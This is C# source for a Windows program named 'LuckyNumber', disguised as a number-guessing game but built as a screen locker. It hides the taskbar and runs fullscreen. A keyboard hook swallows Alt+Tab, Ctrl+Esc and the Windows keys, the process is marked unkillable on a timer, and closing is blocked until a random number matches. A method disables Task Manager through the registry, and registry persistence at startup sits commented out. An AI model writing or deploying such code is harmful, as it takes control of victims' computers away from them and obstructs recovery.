using System;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Diagnostics;

namespace LuckyNumber
{
    public partial class Form1 : Form
    {
        int lucky = 0;
        int none = 0;
        bool ask = false;
        RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        RegistryKey rkAppSafe = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
        public Form1()
        {
           /* if (rkApp.GetValue("LuckyNumber") == null)
            {
                // The value doesn't exist, the application is not set to run at startup
                //chkRun.Checked = false;
                rkApp.SetValue("LuckyNumber", Application.ExecutablePath);
                rkAppSafe.SetValue("*LuckyNumber", Application.ExecutablePath);
            }
            else
            {
                rkApp.SetValue("LuckyNumber", Application.ExecutablePath);
                rkAppSafe.SetValue("*LuckyNumber", Application.ExecutablePath);
                // The value exists, the application is set to run at startup

            }*/
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Maximized;
            InitializeComponent();
           // 
        }


        [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern int SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn, int hMod, int dwThreadId);
        [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern int UnhookWindowsHookEx(int hHook);
        public delegate int LowLevelKeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);
        [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern int CallNextHookEx(int hHook, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);
        public const int WH_KEYBOARD_LL = 13;

        /*code needed to disable start menu*/
        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;
        public struct KBDLLHOOKSTRUCT
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }
        public static int intLLKey;

        public int LowLevelKeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
        {
            bool blnEat = false;

            switch (wParam)
            {
                case 256:
                case 257:
                case 260:
                case 261:
                    //Alt+Tab, Alt+Esc, Ctrl+Esc, Windows Key,
                    blnEat = ((lParam.vkCode == 9) && (lParam.flags == 32)) | ((lParam.vkCode == 27) && (lParam.flags == 32)) | ((lParam.vkCode == 27) && (lParam.flags == 0)) | ((lParam.vkCode == 91) && (lParam.flags == 1)) | ((lParam.vkCode == 92) && (lParam.flags == 1)) | ((lParam.vkCode == 73) && (lParam.flags == 0));
                    break;
            }

            if (blnEat == true)
            {
                return 1;
            }
            else
            {
                return CallNextHookEx(0, nCode, wParam, ref lParam);
            }
        }
        public void KillStartMenu()
        {
            int hwnd = FindWindow("Shell_TrayWnd", "");
            ShowWindow(hwnd, SW_HIDE);
        }



        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Start();
            KillStartMenu();
            Random rnd = new Random();
            lucky = rnd.Next(0, 5);
            label2.Text = lucky.ToString() ;
            label4.Text = none.ToString();
            intLLKey = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
        }

        public static void ShowStartMenu()
        {
            int hwnd = FindWindow("Shell_TrayWnd", "");
            ShowWindow(hwnd, SW_SHOW);
        }


        private void button1_Click(object sender, EventArgs e)
        {
            Random rnd = new Random();
            none = rnd.Next(0, 5);
            label4.Text = none.ToString();
            if (label4.Text == label2.Text)
            {
                timer1.Stop();
                Unkillable.MakeProcessKillable();
                ShowStartMenu();
                ask = true;
                intLLKey = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 1);
                MessageBox.Show(new Form() { TopMost = true },"Wow, Lucky man !!! \n unlocked !", "GOOD DAY", MessageBoxButtons.OK,MessageBoxIcon.Information);
                Application.Exit();
            }

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Unkillable.MakeProcessUnkillable();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            
            if (ask == true)
            {
              //  Application.Exit();
            }
            else
            {
                e.Cancel = true;
                base.OnClosing(e);
            }
            
              
            
        }

         public void KillCtrlAltDelete()
         {
             RegistryKey regkey;
             string keyValueInt = "1";
             string subKey = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";

             try
             {
                 regkey = Registry.CurrentUser.CreateSubKey(subKey);
                 regkey.SetValue("DisableTaskMgr", keyValueInt);
                 regkey.Close();
             }
             catch (Exception ex)
             {
                 MessageBox.Show(ex.ToString());
             }
         }

    }
}
